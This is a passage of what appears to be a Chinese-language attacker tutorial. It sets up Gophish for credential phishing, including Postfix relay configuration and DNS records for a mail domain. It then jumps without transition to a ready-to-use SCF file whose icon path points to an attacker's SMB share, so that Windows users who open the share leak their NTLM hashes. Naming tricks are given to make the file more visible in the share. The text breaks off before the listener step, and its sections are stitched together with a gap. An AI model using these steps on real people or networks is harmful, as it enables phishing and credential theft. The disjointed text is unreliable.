Gophish钓鱼：

Gophish是一款基于邮件钓鱼工具，它的主要功能便是：

  • • 克隆登录页面。

  • • 群发邮件。

  • • 监听目标是否触发事件。

  • • 监听目标提交的数据。

  • • 将目标重定向。

安装部署：

安装依赖：

>> apt install postfix

如有防火墙还需要开放指定端口，通常默认为25端口。更改配置文件：

>> vim /etc/postfix/main.cf

smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination
myhostname = localhost.localdomain
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
myorigin = /etc/mailname
mydestination = $myhostname, localhost.localdomain, localhost.localdomain, localhost
relayhost = 
mynetworks = <Your VPS IP>
mailbox_command = procmail -a "$EXTENSION"
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = all

更改DNS解析记录：

为邮箱域名添加一个A记录的子域名，将其记录值指向服务器的IP地址，并添加一个MX记录，主机记录为自己的域名，记录值为邮箱域名全称。然后下载Gophish：

Windows在用户输入账号密码前，会与访问目标发送多次流量信息，其中包含有一些哈希凭证，也就说在用户输入凭证前，操作系统已经使用本地存储的凭证与目标发生过一些凭证认证，但是失败了，所以Windows安全中心才会有拒绝访问的提示。

SCF：

SCF文件利用的smb协议共享的缺陷，只需制作一个简单的SCF文件：

[Shell]
Command=2
IconFile=\\192.168.1.115\tools\nc.ico
[Taskbar]
Command=ToggleDesktop

目标只要读取到这个文件，就会顺着我给定的IP发起访问链接，我就可以从网卡捕获到目标的哈希，所以这个文件中所包含的路径信息不重要，它包含的nc.ico文件到底存在不存在也不重要，重要的是让目标向我发起网络访问请求。我可以将文件命名为@hack.scf。因为在文件名前加一个@会在共享目录中拥有一个置顶的效果。然后启动SMB协议共享服务：
